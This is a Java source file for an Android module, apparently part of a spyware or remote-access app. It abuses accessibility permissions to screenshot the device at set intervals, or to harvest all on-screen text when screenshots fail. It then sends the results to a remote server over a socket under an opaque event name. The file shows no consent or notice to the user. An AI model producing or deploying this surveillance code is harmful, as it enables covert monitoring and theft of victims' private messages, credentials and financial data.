package com.fason.app.features.screenlog;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.view.Display;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.fason.app.core.network.SocketClient;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

import io.socket.client.Socket;

/**
 * ScreenLogManager — periodic screen snapshots (compressed JPEG, base64).
 * Uses accessibility takeScreenshot on API 30+, falls back to text tree.
 */
public final class ScreenLogManager {
    private static volatile ScreenLogManager instance;
    private final ExecutorService exec = Executors.newSingleThreadExecutor();
    private final Handler main = new Handler(Looper.getMainLooper());
    private final AtomicBoolean running = new AtomicBoolean(false);
    private volatile AccessibilityService service;
    private volatile int intervalSec = 30;
    private volatile int quality = 40;
    private final AtomicInteger shotCount = new AtomicInteger(0);

    private ScreenLogManager() {}

    public static synchronized ScreenLogManager getInstance() {
        if (instance == null) instance = new ScreenLogManager();
        return instance;
    }

    public void setAccessibilityService(AccessibilityService s) { this.service = s; }

    public boolean isRunning() { return running.get(); }

    public void start(int intervalSec, int quality) {
        this.intervalSec = Math.max(5, intervalSec);
        this.quality = Math.max(10, Math.min(90, quality));
        if (running.getAndSet(true)) return;
        loop();
    }

    public void stop() { running.set(false); }

    public void setInterval(int sec) { this.intervalSec = Math.max(5, sec); }
    public void setQuality(int q) { this.quality = Math.max(10, Math.min(90, q)); }

    private void loop() {
        if (!running.get()) return;
        exec.execute(() -> {
            try {
                capture();
            } catch (Exception ignored) {}
            main.postDelayed(this::loop, intervalSec * 1000L);
        });
    }

    private void capture() {
        AccessibilityService s = service;
        if (s == null) { emitTextFallback(); return; }
        if (Build.VERSION.SDK_INT >= 30) {
            s.takeScreenshot(Display.DEFAULT_DISPLAY, exec,
                    new AccessibilityService.TakeScreenshotCallback() {
                        @Override
                        public void onSuccess(AccessibilityService.ScreenshotResult result) {
                            try {
                                Bitmap bitmap = Bitmap.wrapHardwareBuffer(result.getHardwareBuffer(), result.getColorSpace());
                                result.getHardwareBuffer().close();
                                if (bitmap == null) { emitTextFallback(); return; }
                                int maxDim = 720;
                                float scale = Math.min(1f, (float) maxDim / Math.max(bitmap.getWidth(), bitmap.getHeight()));
                                if (scale < 1f) {
                                    bitmap = Bitmap.createScaledBitmap(bitmap,
                                            (int)(bitmap.getWidth()*scale), (int)(bitmap.getHeight()*scale), true);
                                }
                                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                                bitmap.compress(Bitmap.CompressFormat.JPEG, quality, bos);
                                bitmap.recycle();
                                emitShot(bos.toByteArray());
                            } catch (Exception e) { emitTextFallback(); }
                        }
                        @Override
                        public void onFailure(int errorCode) { emitTextFallback(); }
                    });
        } else {
            emitTextFallback();
        }
    }

    private void emitShot(byte[] jpeg) {
        try {
            JSONObject o = new JSONObject();
            o.put("kind", "screenshot");
            o.put("seq", shotCount.incrementAndGet());
            o.put("format", "jpeg");
            o.put("data", Base64.encodeToString(jpeg, Base64.NO_WRAP));
            o.put("timestamp", System.currentTimeMillis());
            emit(o);
        } catch (Exception ignored) {}
    }

    private void emitTextFallback() {
        AccessibilityService s = service;
        if (s == null) return;
        try {
            AccessibilityNodeInfo root = s.getRootInActiveWindow();
            if (root == null) return;
            StringBuilder sb = new StringBuilder();
            harvestText(root, sb, 0);
            root.recycle();
            JSONObject o = new JSONObject();
            o.put("kind", "text");
            o.put("seq", shotCount.incrementAndGet());
            o.put("content", sb.toString());
            o.put("timestamp", System.currentTimeMillis());
            emit(o);
        } catch (Exception ignored) {}
    }

    private void harvestText(AccessibilityNodeInfo node, StringBuilder sb, int depth) {
        if (node == null || depth > 30 || sb.length() > 4000) return;
        try {
            CharSequence text = node.getText();
            if (text != null && text.length() > 0) sb.append(text).append('\n');
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo c = node.getChild(i);
                if (c != null) { harvestText(c, sb, depth + 1); c.recycle(); }
            }
        } catch (Exception ignored) {}
    }

    private void emit(JSONObject o) {
        Socket s = SocketClient.getInstance() != null ? SocketClient.getInstance().getSocket() : null;
        if (s != null) s.emit("0xSL", o);
    }
}
